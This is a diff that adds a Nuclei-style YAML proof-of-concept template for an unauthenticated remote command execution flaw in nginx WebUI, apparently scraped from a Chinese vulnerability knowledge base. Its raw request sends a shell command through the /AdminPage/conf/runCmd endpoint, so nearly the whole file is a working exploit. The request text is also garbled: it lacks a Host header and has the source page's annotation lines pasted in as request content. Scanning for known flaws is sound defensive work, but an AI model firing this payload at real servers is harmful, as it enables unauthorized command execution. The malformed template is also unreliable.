@@ -1,0 +1,40 @@
+id: poc-oy4sifyr7dghftdx
+info:
+  name: nginx WebUI 前台远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oy4sifyr7dghftdx'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oy4sifyr7dghftdx
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
